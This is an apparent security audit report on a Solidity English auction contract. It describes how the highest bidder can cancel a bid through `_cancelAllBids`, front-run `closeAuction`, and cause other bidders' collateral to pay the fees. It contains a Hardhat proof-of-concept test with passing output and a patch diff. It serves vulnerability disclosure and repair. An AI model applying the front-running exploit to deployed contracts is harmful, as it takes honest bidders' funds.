# H-01 The highest bidder can cancel his bid, leading to funds loss of other bidders when closing the auction

## Summary
There are two places where a bidder can cancel his bid: [_cancelBid](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L378-L411) and [_cancelAllBids](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L416-L434). `_cancelAllBids` does not prevent the highest bidder from canceling his bid on the current round.

## Vulnerability Detail
The function [EnglishPeriodicAuctionFacet::cancelAllBidsAndWithdrawCollateral](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/facets/EnglishPeriodicAuctionFacet.sol#L187-L190) allows a bidder to cancel all his bids of previous rounds and withdraw the collateral, it calls [_cancelAllBids](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L416-L434) to cancel all previous bids. **However, the function does not prevent the highest bidder from canceling his bid in the current round**:
```js
function _cancelAllBids(uint256 tokenId, address bidder) internal {
    EnglishPeriodicAuctionStorage.Layout
        storage l = EnglishPeriodicAuctionStorage.layout();

    uint256 currentAuctionRound = l.currentAuctionRound[tokenId];

    for (uint256 i = 0; i <= currentAuctionRound; i++) {
        Bid storage bid = l.bids[tokenId][i][bidder];

        // @audit Does not check if bidder is the highest bidder on currentAuctionRound !
        if (bid.collateralAmount > 0) {
            // Make collateral available to withdraw
            l.availableCollateral[bidder] += bid.collateralAmount;

            // Reset collateral and bid
            bid.collateralAmount = 0;
            bid.bidAmount = 0;
        }
    }
}
```
Someone with a large ETH balance can place bids with a large amount of collateral to discourage others from bidding, and withdraw his collateral later. That is because, when canceling the bid and if the bidder is the highest, the state `highestBids` is not updated.

**This vulnerability causes funds loss of other bidders when closing the auction**. Consider the following scenario:
- a malicious highest bidder monitoring the mempool can front-run the `closeAuction` transaction to call `cancelAllBidsAndWithdrawCollateral` and withdraw his collateral. The `closeAuction` transaction reach [this line](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L534-L536) to send the fees to the beneficiary
```js
// Distribute fee to beneficiary
if (l.highestBids[tokenId][currentAuctionRound].feeAmount > 0) {
    IBeneficiary(address(this)).distribute{
    value: l.highestBids[tokenId][currentAuctionRound].feeAmount
}();
}
```
**Because the highest bidder has already withdrawn his bid, the contract will pay fees from other bidders' collateral who have not withdrawn their collateral yet**. Some bidders may not be able to withdraw their collateral later.

## Proof of Concept
The following proof of concept illustrates the previously described vulnerability.
Place the following test in `test/auction/EnglishPeriodicAuction.ts`:
```ts
describe('cancelBid', function () {
    // ... previous tests

    it('PoC', async function () {
      // Auction start: Now - 200
      // Auction end: Now + 100
      const instance = await getInstance({
        auctionLengthSeconds: 300,
        initialPeriodStartTime: (await time.latest()) - 200,
        licensePeriod: 1000,
      });

      const bidAmount1 = ethers.utils.parseEther('1.1');
      const feeAmount1 = await instance.calculateFeeFromBid(bidAmount1);
      const collateralAmount1 = feeAmount1.add(bidAmount1);

      // new highest bidder
      const bidAmount2 = ethers.utils.parseEther('1.2');
      const feeAmount2 = await instance.calculateFeeFromBid(bidAmount2);
      const collateralAmount2 = feeAmount2.add(bidAmount2);

      await instance
        .connect(bidder1)
        .placeBid(0, bidAmount1, { value: collateralAmount1 });

      await instance
        .connect(bidder2)
        .placeBid(0, bidAmount2, { value: collateralAmount2 });

      await time.increase(100); // auction is ended

      // The highest malicious bidder notices `closeAuction` tx, he front-runs it
      // to cancel his bid and withdraw his collateral.
      await expect(
        instance.connect(bidder2).cancelAllBidsAndWithdrawCollateral(0),
      ).to.not.be.reverted;

      await instance.connect(bidder1).closeAuction(0);

      // bidder 1 cancels his bid to withdraw his collateral, tx will be reverted!
      await expect(instance.connect(bidder1).cancelBidAndWithdrawCollateral(0, 0)).to.be.reverted;
    });
})
```
```bash
EnglishPeriodicAuction
    cancelBid
      ✔ PoC (1010ms)


  1 passing (2s)
```
## Impact
This vulnerability has two impacts:
- A malicious bidder with a large ETH balance can disincentivize other bidders from placing bids as described above
- Loss of funds of other bidders

## Code Snippet
https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L416-L434
## Tool used

Manual Review

## Recommendation
The root reason for this vulnerability is that the `_cancelAllBids` does not prevent the highest bidder from canceling his bid on the current round. Add a check to prevent that like is done in [_cancelBid](https://github.com/sherlock-audit/2024-02-radicalxchange/blob/459dfbfa73f74ed3422e894f6ff5fe2bbed146dd/pco-art/contracts/auction/EnglishPeriodicAuctionInternal.sol#L393-L396).

Below is a suggested update of `_cancelAllBidts`:
```diff
function _cancelAllBids(uint256 tokenId, address bidder) internal {
    EnglishPeriodicAuctionStorage.Layout
        storage l = EnglishPeriodicAuctionStorage.layout();

    uint256 currentAuctionRound = l.currentAuctionRound[tokenId];

+    require(
+        bidder != l.highestBids[tokenId][currentAuctionRound].bidder,
+        'EnglishPeriodicAuction: Cannot cancel bid if highest bidder'
+    );

    for (uint256 i = 0; i <= currentAuctionRound; i++) {
        Bid storage bid = l.bids[tokenId][i][bidder];

        if (bid.collateralAmount > 0) {
        // Make collateral available to withdraw
        l.availableCollateral[bidder] += bid.collateralAmount;

            // Reset collateral and bid
            bid.collateralAmount = 0;
            bid.bidAmount = 0;
        }
    }
}
```